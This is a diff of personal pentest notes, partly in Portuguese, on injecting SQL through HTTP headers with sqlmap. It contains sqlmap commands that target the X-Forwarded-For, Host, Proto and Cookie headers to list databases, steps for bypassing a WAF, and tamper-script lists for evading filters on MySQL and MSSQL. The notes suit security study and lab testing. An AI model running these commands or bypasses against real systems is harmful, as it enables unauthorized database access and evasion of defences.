@@ -20,6 +20,8 @@
 	X-Forwarded-for					      X-Forwarded-for 
 	
 	O servidor recebe uma conexão do proxie/firewall. O ip do cliente é isolado e adicionado no X-Forwarded-for e passaado para o site para ele saber quem se conectou. 
+	
+	
 	nano header.txt 
 	
 	GET /cat.php?id=3 HTTP/1.1
@@ -33,10 +35,10 @@
 	X-Forwarded-Proto Non-Standard
 		
 	
-	sqlmap -r header.txt -p X-Forwarded-For --dbs --dbms=mysql --no-cast--proxy=http://127.0.0.1:8080
-	sqlmap -r header.txt -p X-Forwarded-Host --dbs --dbms=mysql --no-cast --proxy=http://127.0.0.1:8080
-	sqlmap -r header.txt -p X-Forwarded-Proto --dbs --dbms=mysql --no-cast --proxy=http://127.0.0.1:8080
-	sqlmap -r header.txt -p Cookies --dbs --dbms=mysql --no-cast --proxy=http://127.0.0.1:8080
+	sqlmap -r header.txt -p X-Forwarded-For --dbs --flush-session --dbms=mysql --no-cast--proxy=http://127.0.0.1:8080 -v 
+	sqlmap -r header.txt -p X-Forwarded-Host --dbs --flush-session --dbms=mysql --no-cast --proxy=http://127.0.0.1:8080 -v 
+	sqlmap -r header.txt -p X-Forwarded-Proto --dbs --flush-session --dbms=mysql --no-cast --proxy=http://127.0.0.1:8080 -v 
+	sqlmap -r header.txt -p Cookies --dbs --flush-session --dbms=mysql --no-cast --proxy=http://127.0.0.1:8080 -v 
 	
 	--identify-waf - > identificar firewall 
 	--skip-waf não identifique o firewall  
@@ -54,8 +56,19 @@
 	Como usar o sqlmap? 
 	1 ) Encontra o waf
 	2 ) tamper pro bypass encontrado 
-	3 ) --skip-waf para não identificar o firewall 
+	3 ) --skip-waf sqlmap não identificar o firewall 
 
+-------------------
+General Tamper testing:
 
-               
-	 
+tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
+
+-------------------
+MySQL:
+
+tamper=TAMPER 
+tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
+-------------------
+MSSQL: 
+
+tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
